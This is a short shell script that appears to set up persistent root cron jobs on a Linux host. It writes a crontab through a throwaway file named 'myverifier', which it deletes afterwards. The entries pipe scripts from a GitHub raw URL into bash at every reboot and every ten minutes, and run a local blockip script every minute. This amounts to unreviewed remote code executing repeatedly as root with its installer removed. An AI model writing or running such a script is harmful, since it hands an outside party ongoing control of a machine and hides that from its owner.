#!/bin/sh
sudo su
echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/inreload.sh | bash
1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/Ho015.sh | bash
*/1 * * * * sudo bash /root/blockip.sh
 " >> myverifier
sudo crontab myverifier
rm myverifier

